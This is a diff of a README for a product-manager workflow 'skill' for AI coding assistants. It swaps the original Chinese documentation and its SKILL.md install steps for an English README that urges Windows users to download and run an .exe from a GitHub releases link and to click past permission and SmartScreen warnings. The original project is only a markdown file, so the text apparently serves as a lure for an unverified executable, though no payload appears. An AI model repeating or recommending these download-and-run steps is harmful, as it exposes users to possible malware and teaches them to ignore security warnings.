@@ -1,227 +1,281 @@
-# PM Agile Workflow Skill
+# 🧭 pm-agile-workflow - Turn Ideas Into Clear Delivery
 
-> 敏捷产品经理需求产出工作流 - 从模糊想法到可交付的 PRD + 原型 + 流程图
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/antoninfatty836/pm-agile-workflow/releases)
 
-**快速导航：** [简介](#简介) | [核心价值](#核心价值) | [适用场景](#适用场景) | [七步工作流](#七步工作流) | [产出物清单](#产出物清单) | [目录结构](#目录结构) | [快速开始](#快速开始) | [常见问题](#常见问题) | [安装](#安装)
+## 🖥️ What this app does
 
----
+pm-agile-workflow helps you turn a rough product idea into a clear delivery plan.
 
-## 简介
+It guides you through a strict 7-step agile PM workflow. You can use it to:
 
-这是一个结构化的产品经理工作流技能，帮助将模糊的产品需求逐步转化为清晰、可评审、可演示的完整交付物。通过七步法引导式流程，确保需求被充分理解、原型被充分验证、文档被充分完善。
+- shape a product idea
+- build an interactive HTML prototype
+- write a PRD
+- create Mermaid flowcharts
+- track versioned delivery
+- keep each step in order
+- move from idea to a working plan with less guesswork
 
-## 核心价值
+This app is made for people who want a simple path from early idea to a structured product brief.
 
-- **需求收敛**：把模糊想法逐步厘清成清晰业务逻辑
-- **原型验证**：通过交互式 HTML 原型发现交互漏洞和边界条件
-- **完整交付**：产出可展示、可评审、可迭代的 PRD + 原型 + 流程图
+## 📦 Before you start
 
-## 适用场景
+You need:
 
-- 只有一个产品想法，还说不清流程和边界
-- 需要输出专业级 PRD，但不希望只得到空框架
-- 需要交互式 HTML 原型来验证页面逻辑和异常流
-- 希望 PRD 中直接嵌入原型切片，方便评审对齐
+- a Windows computer
+- an internet connection
+- enough free space to download the app
+- permission to run downloaded files on your PC
 
-## 触发方式
+Recommended setup:
 
-当用户提供以下任一形式的输入时自动启用：
-- 产品想法 / 功能需求
-- 业务流程描述
-- 草图 / 截图
-- 口头描述
-- 会议纪要
+- Windows 10 or Windows 11
+- at least 4 GB RAM
+- a modern browser for opening HTML output
+- a mouse or touchpad for moving through the workflow
 
-说出类似以下内容即可触发：
-> "我想做一个 XX 功能"
-> "帮我把这个需求整理成 PRD"
-> "我有个产品想法，需要出原型和文档"
+## 🚀 Download the app
 
-## 七步工作流
+Visit this page to download the Windows release:
 
-```
-┌─────────────────────────────────────────────────────────┐
-│  Step 1: 对话式需求采集与确认                             │
-│  → 复述理解 → 7维度评估 → 3轮追问 → 等待确认              │
-└─────────────────────────────────────────────────────────┘
-                          ↓
-┌─────────────────────────────────────────────────────────┐
-│  Step 2: 项目初始化与目录架构搭建                         │
-│  → 创建 requirements/ prototypes/ flows/ 目录           │
-└─────────────────────────────────────────────────────────┘
-                          ↓
-┌─────────────────────────────────────────────────────────┐
-│  Step 3: 输出第一版详细 PRD                              │
-│  → 背景/目标/场景/功能清单/业务逻辑 → 等待确认            │
-└─────────────────────────────────────────────────────────┘
-                          ↓
-┌─────────────────────────────────────────────────────────┐
-│  Step 4: 产出高保真 HTML 原型 ⭐ 核心验证阶段              │
-│  → 单文件 HTML + Tailwind CSS + Focus Mode → 迭代优化    │
-└─────────────────────────────────────────────────────────┘
-                          ↓
-┌─────────────────────────────────────────────────────────┐
-│  Step 5: 输出 Mermaid 流程图                            │
-│  → 主流程 + 异常分支 + 边界处理                          │
-└─────────────────────────────────────────────────────────┘
-                          ↓
-┌─────────────────────────────────────────────────────────┐
-│  Step 6: 产出最终版 PRD（内嵌原型切片）                   │
-│  → 整合所有产物 → iframe 嵌入原型 → 完整交付              │
-└─────────────────────────────────────────────────────────┘
-                          ↓
-┌─────────────────────────────────────────────────────────┐
-│  Step 7: 版本迭代与管理                                 │
-│  → 版本隔离 → 变更日志 → PRD/原型同步                    │
-└─────────────────────────────────────────────────────────┘
-```
+https://github.com/antoninfatty836/pm-agile-workflow/releases
 
-## 产出物清单
+Look for the latest release, then pick the Windows file from the assets list. If there are more than one, choose the file with the `.exe` extension or the file marked for Windows.
 
-| 产物 | 位置 | 说明 |
-|------|------|------|
-| PRD 文档 | `requirements/prd_vX.X.html` | HTML 格式，支持独立打开 |
-| 交互原型 | `prototypes/prototype_vX.X.html` | 单文件 HTML，Tailwind CSS |
-| 流程图 | `flows/flowchart_vX.X.md` | Mermaid 格式 |
-| 附件资料 | `attachments/` | 原始资料、数据字典等 |
+## 🪟 Install on Windows
 
-## 目录结构
+1. Open the release page.
+2. Find the newest release at the top.
+3. Open the Assets section.
+4. Download the Windows file.
+5. If Windows asks for permission, choose Run or Keep, then run the file.
+6. If the app comes as a `.zip` file, extract it first.
+7. Open the app from the extracted folder or from the installer.
 
-```
-<project-name>/
-├── requirements/        # PRD 文档
-├── prototypes/          # HTML 原型
-├── flows/               # Mermaid 流程图
-├── attachments/         # 附件资料
-└── templates/           # 模板文件
-```
+If Windows shows a SmartScreen message, check the app name and release page, then choose the option that lets you continue.
 
-## 自动预览
+## 🧭 First run
 
-AI 产出 HTML 文件后会**自动在浏览器中打开**，无需手动操作：
+When you open pm-agile-workflow for the first time, follow the workflow in order.
 
-| 步骤 | 产出文件 | 自动打开 |
-|------|----------|----------|
-| Step 3 | `requirements/prd_v1.0.html` | ✅ |
-| Step 4 | `prototypes/prototype_v1.0.html` | ✅ |
-| Step 6 | `requirements/prd_v1.0_final.html` | ✅ |
+You will usually see a guided flow that asks for:
 
-## 原型特性
+- the product idea
+- the main user problem
+- the target user
+- the core goal
+- the first useful version
+- the steps in the process
+- the delivery version
 
-- **单文件 HTML**：便于分享和版本管理
-- **Tailwind CSS**：现代、清晰的视觉风格
-- **Focus Mode**：支持 `?focus=<feature_id>` 参数，用于 PRD 切片展示
-- **完整状态**：默认态、弹窗态、空状态、成功态、失败态、加载态
-- **Hash 路由**：支持 `#login` 等页面切换
+Enter short, clear answers. You do not need technical detail. A plain description works well.
 
-## PRD 特性
+## 🪜 The 7-step workflow
 
-- **HTML 格式**：独立打开即可使用，无需依赖
-- **模块化结构**：每个功能包含流程图 + 规则描述 + 原型切片
-- **iframe 嵌入**：原型以沙箱方式嵌入，聚焦展示特定功能
-- **版本切换器**：右上角下拉菜单切换历史版本
+### 1. Capture the idea
 
-## 执行原则
+Start with the rough product idea.
 
-1. 严格按步骤推进，禁止一次性输出所有结果
-2. 每步确认后再继续，不跳步、不压缩
-3. 原型修改同步更新 PRD
-4. 历史版本物理隔离，不覆盖
+Write:
 
-## 快速口诀
+- what the product should do
+- who it is for
+- what problem it solves
 
-> 先问清，再建目录
-> 先出初版 PRD，再做 HTML 原型
-> 原型每改一处，PRD 同步一处
-> 原型跑通后，再补 Mermaid 流程图
-> 最终交付必须可读、可演示、可迭代
+Keep it simple. One or two short paragraphs are enough.
 
-## 快速开始
+### 2. Define the user problem
 
-**输入：** "我想做一个积分兑换功能"
+Explain the real problem behind the idea.
 
-**执行过程：**
-```
-Step 1 → 追问澄清：积分来源？兑换限制？库存处理？
-Step 2 → 创建目录结构
-Step 3 → 输出 prd_v1.0.html
-Step 4 → 输出 prototype_v1.0.html（含 Focus Mode）
-Step 5 → 输出 flowchart_v1.0.md
-Step 6 → 输出 prd_v1.0_final.html（内嵌原型切片）
-Step 7 → 版本记录、变更日志
-```
+Ask:
 
-**最终产出：**
-```
-points-exchange/
-├── requirements/
-│   ├── prd_v1.0.html
-│   └── prd_v1.0_final.html
-├── prototypes/
-│   └── prototype_v1.0.html
-├── flows/
-│   └── flowchart_v1.0.md
-└── attachments/
-```
+- what is broken today
+- what users struggle with
+- why this matters now
 
-## 前置依赖
+This step helps keep the project focused on a clear need.
 
-| 依赖项 | 说明 | 必需 |
-|--------|------|------|
-| Tailwind CSS | 原型样式，CDN 自动引入 | 否 |
-| Mermaid.js | 流程图渲染，CDN 自动引入 | 否 |
-| 现代浏览器 | Chrome / Firefox / Safari / Edge | 是 |
+### 3. Shape the product scope
 
-## 常见问题
+Decide what belongs in the first version.
 
-**Q: 原型无法预览？**
-检查 CDN 资源是否可访问，尝试直接用浏览器打开 HTML 文件。
+Include:
 
-**Q: Mermaid 渲染失败？**
-避免节点文本中使用特殊字符 `" ' < > & { }`，检查语法闭合。
+- core features
+- what is out of scope
+- any limits you want to keep
 
-**Q: 只想执行部分步骤？**
-直接说明即可，如 "我已有 PRD，只需要出原型"。
+This keeps the plan small enough to build and test.
 
-**Q: Focus Mode 不生效？**
-检查 URL 参数格式：`?focus=login#login`
+### 4. Build the interactive HTML prototype
 
-## 安装
+Use the workflow to create an HTML prototype.
 
-### Claude Code
+This part helps you:
 
-将 `SKILL.md` 放入 skills 目录：
+- show the main screens
+- test the user path
+- review the product before full build work starts
 
-```bash
-~/.claude/skills/pm-agile-workflow/SKILL.md
-```
+You can open the HTML output in a browser and share it with others.
 
-**唤起方式：** 直接在对话中描述需求即可自动触发，或输入 `/pm-agile-workflow` 手动调用。
+### 5. Write the PRD
 
-### Cursor 编辑器
+The app helps you create a Product Requirements Document, or PRD.
 
-1. 打开 Cursor settings
-2. 找到 **Skills** 设置入口
-3. 点击「Add Skill」添加 `SKILL.md` 文件
+A PRD usually includes:
 
-或放入配置目录：
+- the product goal
+- user needs
+- feature list
+- success measures
+- edge cases
+- release scope
 
-```bash
-~/.cursor/skills/pm-agile-workflow/SKILL.md
-```
+This gives you one clear document for the product plan.
 
-**唤起方式：** 在 Chat 面板中输入 `@pm-agile-workflow` 或直接描述产品需求。
+### 6. Create Mermaid flowcharts
 
-### Trae 编辑器
+Use Mermaid flowcharts to map the process.
 
-1. 打开 Trae 设置面板
-2. 找到 **AI 助手** → **Skills / 技能** 设置入口
-3. 点击「添加 Skill」，选择或粘贴 `SKILL.md` 文件
+These diagrams can show:
 
-或者放入配置目录：
+- user steps
+- decision points
+- system flow
+- version changes
 
-```bash
-~/.trae/skills/pm-agile-workflow/SKILL.md
-```
+Mermaid charts are useful when you want a simple visual map that stays easy to update.
 
-**唤起方式：** 在对话中输入 `/pm-agile-workflow` 或直接描述产品需求触发。
+### 7. Prepare versioned delivery
+
+Finish by planning delivery in versions.
+
+You can break the work into:
+
+- Version 1
+- Version 1.1
+- Version 2
+
+This helps you ship in steps and keep the plan clear.
+
+## 🧾 Typical output files
+
+The app may create or help you prepare files like these:
+
+- `PRD.md`
+- `prototype.html`
+- `workflow.mmd`
+- `version-plan.md`
+- export folders for each release step
+
+File names may vary, but the goal stays the same: give you a structured path from idea to delivery.
+
+## 🧰 How to use it well
+
+Use short input. Clear text works best.
+
+Good inputs look like:
+
+- a booking app for small clinics
+- a task tool for remote teams
+- a dashboard for weekly sales review
+
+Try to include:
+
+- the user
+- the problem
+- the result you want
+
+Avoid long product stories in the first pass. You can add detail later.
+
+## 🔍 What makes this workflow different
+
+This workflow is stricter than a loose brainstorming tool.
+
+It works well when you want:
+
+- clear order
+- less drift
+- a repeatable product process
+- one path from idea to plan
+- output that supports design and delivery
+
+It is useful when several people need the same structure for a product brief.
+
+## 🛠️ Common use cases
+
+Use pm-agile-workflow for:
+
+- a new app idea
+- an internal tool
+- a feature request
+- a startup concept
+- a product redesign
+- a scoped MVP
+- a delivery plan for a small team
+
+It fits early product work where the goal is to move fast without losing structure.
+
+## 📁 Suggested folder use
+
+If the app stores files in a project folder, keep them in one place.
+
+A simple folder layout can help:
+
+- `idea/` for raw notes
+- `prototype/` for HTML output
+- `docs/` for PRD files
+- `diagrams/` for Mermaid files
+- `release/` for versioned delivery notes
+
+This makes it easier to find each part later.
+
+## ❓ Common questions
+
+### Do I need coding knowledge?
+
+No. The workflow is built for plain product work. You can use short written answers and follow the steps on screen.
+
+### Can I use it for any product idea?
+
+Yes. It works best for software products, internal tools, and digital workflows.
+
+### Can I open the prototype in a browser?
+
+Yes. The HTML prototype is meant to open in a browser.
+
+### Can I use it with a team?
+
+Yes. The PRD and flowcharts help you share the plan with others.
+
+### What if my idea is vague?
+
+Start with the user and the problem. The workflow helps you shape the rest.
+
+## 🔐 Windows tips
+
+If Windows blocks the file:
+
+- check that you downloaded it from the release page
+- right-click the file and look for Run
+- if the file is in a zip archive, extract it first
+- keep the app in a folder you can find again
+
+If the app opens but nothing seems to happen:
+
+- wait a few seconds
+- check if a browser window opened
+- look for a file output folder near the app
+
+## 🧭 Getting help
+
+If the app does not open or the release file is hard to find:
+
+- return to the release page
+- download the latest Windows asset
+- make sure the file finished downloading
+- try again from the extracted folder
+
+If the workflow feels too detailed, start with a smaller idea and fill in each step one by one.
